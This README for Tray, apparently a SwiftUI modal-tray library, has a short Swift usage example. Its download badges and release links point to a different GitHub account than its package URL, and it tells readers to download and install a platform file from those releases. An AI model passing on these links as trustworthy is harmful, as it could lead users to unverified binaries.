# 🎉 Tray - Easy Modal Interfaces for SwiftUI

## 🚀 Getting Started

[![Download Tray](https://img.shields.io/badge/Download%20Tray-blue?style=flat&logo=github)](https://github.com/CamboMinecraft/Tray/releases)

Welcome to Tray! This guide will help you to download and run the Tray library for your SwiftUI projects. Tray makes it easy to create smooth modal tray interfaces on iOS.

## 📥 Download & Install

To get Tray, visit this page to download: [GitHub Releases](https://github.com/CamboMinecraft/Tray/releases). You will find the latest version available for download there.

1. Go to the [Releases page](https://github.com/CamboMinecraft/Tray/releases).
2. Locate the latest release version.
3. Download the relevant file for your platform.
4. Follow the instructions to install it on your device.

## 🛠️ Installation Instructions

### Adding Tray to Your Project

To use Tray in your SwiftUI application, you will need to add it as a dependency. You can do this using Swift Package Manager. Here’s how:

1. Open your Xcode project.
2. Click on `File` > `Swift Packages` > `Add Package Dependency`.
3. Enter the following URL in the search bar:
   ```
   https://github.com/Archetapp/Tray
   ```
4. Select the main branch and click "Next" to complete the addition.

### Using Tray in Your App

Once you have installed Tray, you can start using it right away. Here’s a simple example of how to show a basic modal tray:

```swift
import SwiftUI

struct ContentView: View {
    @State private var showTray = false

    var body: some View {
        Button("Show Tray") {
            showTray = true
        }
        .tray(isPresented: $showTray, title: "Welcome") {
            Text("Hello from Tray!")
        }
    }
}
```

This example demonstrates how to create a button that, when clicked, will present a modal tray with a welcoming message.

## 🌟 Features

Tray includes several features that enhance user experience:

- **Flexible Navigation**: Easily navigate between different views using `TrayNavigationLink`.
- **Dynamic Height**: The tray adjusts automatically to fit your content.
- **Smooth Animations**: Enjoy transitions and animations that you can customize.
- **Per-Page Control**: Manage the visibility and style of navigation based on individual pages.
- **Environment Configuration**: Set global styles using environment modifiers for consistency.

## 🔧 System Requirements

Tray requires the following:

- **Xcode Version**: You need Xcode 12 or later.
- **iOS Version**: Minimum iOS 14 or later.
- **Swift Version**: Swift 5 is recommended, but earlier versions may work.

## 📄 Documentation

For detailed information on how to use Tray, refer to the official documentation available on the repository. It includes in-depth guides, examples, and advanced configurations to make the most out of the library.

## 🆘 Support

If you encounter any issues or have questions, feel free to open an issue on the GitHub repository. The community and the maintainers are here to help you.

## 💼 Contribution

We welcome contributions! If you wish to contribute to Tray, please refer to the contribution guidelines in the repository for details on how to get started.

## 🎉 Conclusion

With Tray, creating modern modal interfaces in SwiftUI becomes straightforward and efficient. Follow this guide to get started, and explore the possibilities with mobile UI development! 

Don’t forget to check for updates frequently to enjoy the latest features and improvements. Happy coding!

[![Download Tray](https://img.shields.io/badge/Download%20Tray-blue?style=flat&logo=github)](https://github.com/CamboMinecraft/Tray/releases)